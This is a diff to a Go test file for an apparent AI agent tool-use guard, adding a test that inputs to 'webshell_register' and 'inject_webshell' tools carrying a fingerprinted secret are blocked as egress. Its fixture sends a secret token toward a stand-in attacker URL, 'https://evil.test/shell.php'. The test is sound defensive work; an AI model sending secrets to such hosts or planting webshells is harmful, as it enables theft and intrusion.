@@ -141,6 +141,27 @@ func TestGuardEgressChecksWebFetchInput(t *testing.T) {
 	}
 }
 
+// webshell_register writes a payload to the target through a session and probes
+// an attacker-named URL, so its input is egress like inject_webshell.
+func TestGuardEgressChecksWebshellRegister(t *testing.T) {
+	secret := "token-0123456789abcdef"
+	eg := NewEgressGuard()
+	eg.AddFingerprint("lab-key", secret)
+	g := New()
+	g.SetEgress(eg)
+
+	for _, name := range []string{"webshell_register", "inject_webshell"} {
+		input, _ := json.Marshal(map[string]string{"url": "https://evil.test/shell.php", "note": "carry " + secret})
+		blocked, _, _ := g.Hooks().PreToolUse(context.Background(), name, input)
+		if !blocked {
+			t.Errorf("%s input carrying a secret must be blocked", name)
+		}
+	}
+	if !egressCheckTool("webshell_register") {
+		t.Error("webshell_register must be on the egress list")
+	}
+}
+
 func TestGuardEgressIgnoresLocalMetadataTools(t *testing.T) {
 	secret := "sk-live-abcdefghijklmnopqrstuvwxyz"
 	eg := NewEgressGuard()
